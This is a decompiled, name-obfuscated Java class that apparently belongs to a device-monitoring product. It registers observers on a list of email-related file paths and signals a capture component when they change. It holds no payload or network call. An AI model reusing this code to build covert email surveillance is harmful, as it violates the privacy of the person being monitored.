package com.vvt.capture.email.b.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import java.util.Iterator;
import java.util.List;

public class a
  implements e, com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private i c;
  private com.vvt.n.a.b d;
  private boolean e;
  
  public a(com.vvt.n.a.b paramb)
  {
    this.d = paramb;
    this.e = false;
  }
  
  public void a(i parami)
  {
    boolean bool = b;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      Object localObject = this.d;
      if (localObject != null)
      {
        localObject = com.vvt.capture.email.b.b.b();
        Iterator localIterator = ((List)localObject).iterator();
        for (;;)
        {
          bool = localIterator.hasNext();
          if (!bool) {
            break;
          }
          localObject = (String)localIterator.next();
          com.vvt.n.a.b localb = this.d;
          localb.a((String)localObject, this);
        }
      }
      bool = a;
      if (!bool) {}
    }
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    i locali = this.c;
    locali.a();
    bool = b;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      Object localObject = this.d;
      if (localObject != null)
      {
        localObject = com.vvt.capture.email.b.b.b();
        Iterator localIterator = ((List)localObject).iterator();
        for (;;)
        {
          bool = localIterator.hasNext();
          if (!bool) {
            break;
          }
          localObject = (String)localIterator.next();
          com.vvt.n.a.b localb = this.d;
          localb.a((String)localObject);
        }
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */